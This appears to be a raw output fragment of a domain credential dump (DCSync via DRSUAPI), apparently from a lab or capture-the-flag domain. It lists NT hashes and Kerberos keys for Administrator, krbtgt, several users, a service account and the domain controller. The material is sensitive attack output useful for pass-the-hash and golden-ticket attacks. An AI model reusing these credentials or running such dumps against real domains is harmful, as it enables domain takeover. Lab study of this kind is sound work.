[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::
DRY.MARTINI.BARS\\mprice:1104:aad3b435b51404eeaad3b435b51404ee:821e97e217ddc6e433ac92e0b92955fc:::
DRY.MARTINI.BARS\\athena.t0:1105:aad3b435b51404eeaad3b435b51404ee:5f4ae3ddff03f730dd0f1ab97f5849eb:::
DRY.MARTINI.BARS\\ATHENA_SVC:1106:aad3b435b51404eeaad3b435b51404ee:5f4ae3ddff03f730dd0f1ab97f5849eb:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d97154988bebd9703ca12f27b6275c3e:::
[*] Kerberos keys grabbed
Administrator:0x14:99a71052cd68e924eec9cf8a584d87e078ffad22fb2e33afc922404b0f4d87d7
Administrator:0x13:36ebe3323c3bf7178d5d89ebc0e3f1b3
Administrator:aes256-cts-hmac-sha1-96:ab535f3a35d406cd9a2ab55e4b5ac037b1bcf6ff7c0fe70cc5e3fd05eb7e85e9
Administrator:aes128-cts-hmac-sha1-96:46a8a37a5f4c1da2f17e36965dd6561d
Administrator:0x17:d5cad8a9782b2879bf316f56936f1e36
krbtgt:aes256-cts-hmac-sha1-96:b2679af0c2283eff6926eda9fcdac99c7bc2b118158df3934a33d5f4f50baed3
krbtgt:aes128-cts-hmac-sha1-96:bfb79c68ae71254e572fd65dd34f5b5c
krbtgt:0x17:22ebc290e67668629c8d0812662a9c51
DRY.MARTINI.BARS\\mprice:0x14:3b3563e3bdc4cce3220d51867bbcb8d830a840ae78432e0722b545da9f401164
DRY.MARTINI.BARS\\mprice:0x13:a2e065848dc2faecefa27d335cd5ebfc
DRY.MARTINI.BARS\\mprice:aes256-cts-hmac-sha1-96:092d7fc4f6b1222436778e6bb6eccd5b82d4e2b5312c276f7a6c53afe5061846
DRY.MARTINI.BARS\\mprice:aes128-cts-hmac-sha1-96:0063cbe70b3626bb09b5b26dfabe040f
DRY.MARTINI.BARS\\mprice:0x17:821e97e217ddc6e433ac92e0b92955fc
DRY.MARTINI.BARS\\athena.t0:0x14:54eb9e1180c0285453533d176b3be7617d1fedb9f06091e73e2e5fd9b8215160
DRY.MARTINI.BARS\\athena.t0:0x13:0137cc7731a76b1d1dc50564410e7cf6
DRY.MARTINI.BARS\\athena.t0:aes256-cts-hmac-sha1-96:8d4ed2234bb59fc1ca26dc088be3898b4049b2908a4f72c9e531036a9756c979
DRY.MARTINI.BARS\\athena.t0:aes128-cts-hmac-sha1-96:746057ac92411bf547e6ea27c7a4a99a
DRY.MARTINI.BARS\\athena.t0:0x17:5f4ae3ddff03f730dd0f1ab97f5849eb
DRY.MARTINI.BARS\\ATHENA_SVC:0x14:0ce1d6094d25abd2b9894883bdfced0da53e93a33c6013ce0fb7214873754419
DRY.MARTINI.BARS\\ATHENA_SVC:0x13:24298886655586580fa8dc97a7dbd1f6
DRY.MARTINI.BARS\\ATHENA_SVC:aes256-cts-hmac-sha1-96:726be946b26085fe0e21c3603b7a4648d14f5dafa0859f0e0bfca047b828e8fa
DRY.MARTINI.BARS\\ATHENA_SVC:aes128-cts-hmac-sha1-96:d58ac3c4825b34faff4ece06402d9f6d
DRY.MARTINI.BARS\\ATHENA_SVC:0x17:5f4ae3ddff03f730dd0f1ab97f5849eb
DC01$:0x14:c9066f0b5b5e1b6a5710f20ab70e713c9bb6456a23aafde952b5ee60474a9727
DC01$:0x13:f929d34a7b6956177116d3e7b5292b6f
DC01$:aes256-cts-hmac-sha1-96:f822edbd73e4ca15eafc1596466cf15eee5599ee9ce424ac31e6b2c89bb8abbc
DC01$:aes128-cts-hmac-sha1-96:d22175300e1511a8aa3ac39273fbe3f7
DC01$:0x17:d97154988bebd9703ca12f27b6275c3e
[*] Cleaning up... 
```
